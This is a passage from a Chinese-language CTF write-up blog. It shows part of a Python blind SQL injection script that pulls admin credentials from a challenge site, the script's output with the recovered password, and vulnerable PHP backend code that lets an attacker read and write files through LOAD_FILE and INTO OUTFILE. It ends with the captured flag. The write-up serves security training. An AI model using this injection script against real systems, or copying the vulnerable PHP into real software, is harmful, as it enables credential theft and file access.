check_condition(f&quot;&#123;col&#125;=&#123;col&#125;&quot;):</span><br><span class="line">            print(f&quot;[+] 成功定位用户名列: &#123;col&#125;&quot;)</span><br><span class="line">            username_col = col</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] 未在字典中找到特定列名，将使用默认值 &#x27;user&#x27; 继续尝试。&quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;-&quot; * 50)</span><br><span class="line"></span><br><span class="line">    # --- 阶段 2: 遍历 ID 并提取数据 ---</span><br><span class="line">    print(&quot;[2] 开始遍历 ID (0-5) 并提取凭证...&quot;)</span><br><span class="line">    </span><br><span class="line">    for user_id in range(0, 6):</span><br><span class="line">        # 快速探测 ID 是否存在</span><br><span class="line">        if not check_condition(f&quot;id=&#123;user_id&#125;&quot;):</span><br><span class="line">            print(f&quot;[-] ID=&#123;user_id&#125; 不存在&quot;)</span><br><span class="line">            continue</span><br><span class="line">            </span><br><span class="line">        print(f&quot;[!] 发现有效账户 ID=&#123;user_id&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">        # 提取用户名</span><br><span class="line">        username = extract_data(user_id, username_col, max_len=20)</span><br><span class="line">        </span><br><span class="line">        # 提取密码 (列名固定为 passwd，之前已验证)</span><br><span class="line">        password = extract_data(user_id, &quot;passwd&quot;, max_len=60)</span><br><span class="line">        </span><br><span class="line">        print(f&quot;\n[SUCCESS] 账户获取成功 -&gt; ID: &#123;user_id&#125; | User: &#123;username&#125; | Pass: &#123;password&#125;&quot;)</span><br><span class="line">        print(&quot;-&quot; * 30)</span><br><span class="line"></span><br><span class="line">    print(&quot;[*] 所有任务结束。&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>最后就得到了这样的结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(base) PS C:\Users\G1731\Downloads&gt; &amp; C:/Users/G1731/anaconda3/python.exe c:/Users/G1731/Downloads/2.py</span><br><span class="line">[*] 开始执行 SQL 盲注全量提取脚本...</span><br><span class="line">[*] 目标 URL: http://18f25160-98b8-4fbe-b4b0-b55ffc1c6886.ctf.g0dsec.com/check.php</span><br><span class="line">--------------------------------------------------</span><br><span class="line">[1] 正在探测存放用户名的列名...</span><br><span class="line">[+] 成功定位用户名列: user</span><br><span class="line">--------------------------------------------------</span><br><span class="line">[2] 开始遍历 ID (0-5) 并提取凭证...</span><br><span class="line">[!] 发现有效账户 ID=0</span><br><span class="line">    [+] 正在提取 ID=0 的 user ...</span><br><span class="line">        [&gt;] 进度: admin</span><br><span class="line">    [OK] user: admin</span><br><span class="line">    [+] 正在提取 ID=0 的 passwd ...</span><br><span class="line">        [&gt;] 进度: 60D53cP455w0rd</span><br><span class="line">    [OK] passwd: 60D53cP455w0rd</span><br><span class="line"></span><br><span class="line">[SUCCESS] 账户获取成功 -&gt; ID: 0 | User: admin | Pass: 60D53cP455w0rd</span><br><span class="line">------------------------------</span><br><span class="line">[-] ID=1 不存在</span><br><span class="line">[-] ID=2 不存在</span><br><span class="line">[-] ID=3 不存在</span><br><span class="line">[-] ID=4 不存在</span><br><span class="line">[-] ID=5 不存在</span><br><span class="line">[*] 所有任务结束。</span><br></pre></td></tr></table></figure>
+
+<p>拿到账号密码后，在去登入，就成功了。</p>
+<p><img src="/images/QQ20260102-140332.png" alt="alt text"></p>
+<p>提示去访问这个页面，给了一个压缩包，是后台的一部分源码。</p>
+<p>目标点在这：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">    echo &quot;您没有权限访问此页面, 3秒后自动跳转至主页面&quot;;</span><br><span class="line">    echo &quot;&lt;script&gt;setTimeout(function()&#123; window.location.href = &#x27;index.html&#x27;; &#125;, 3000);&lt;/script&gt;&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">include &quot;database.php&quot;;</span><br><span class="line">$data = new Mysql();</span><br><span class="line">$s = $_POST[&#x27;s&#x27;];</span><br><span class="line">$d = $_POST[&#x27;d&#x27;];</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;operate&#x27;]))&#123;</span><br><span class="line">    switch ($_GET[&#x27;operate&#x27;]) &#123;</span><br><span class="line">        case &quot;into&quot;:</span><br><span class="line">            $sql = &quot;SELECT &#x27;$s&#x27; INTO OUTFILE &#x27;$d&#x27;&quot;;</span><br><span class="line">            $data-&gt;query($sql);</span><br><span class="line">            break;</span><br><span class="line">        case &quot;load&quot;:</span><br><span class="line">            $sql = &quot;SELECT LOAD_FILE(&#x27;$d&#x27;)&quot;;</span><br><span class="line">            echo mysqli_fetch_array($data-&gt;query($sql))[0];</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            echo &quot;It&#x27;s not allowed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这边存在一个当我们以正确的用户密码登入后将获得直接读取文件的漏洞点。</p>
+<p>所以直接利用bp完成，操作。</p>
+<p>然后获得flag。</p>
+<p><strong>G0D{90825d5e-416b-41c7-8544-37a99bc9fba5}</strong></p>
+<hr>
+<p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
+
+        </div>
+    </article>
+</div>
+
+</div>
+
+<script src="/js/main.js?v=1767337365559"></script>
+</body>
+</html>
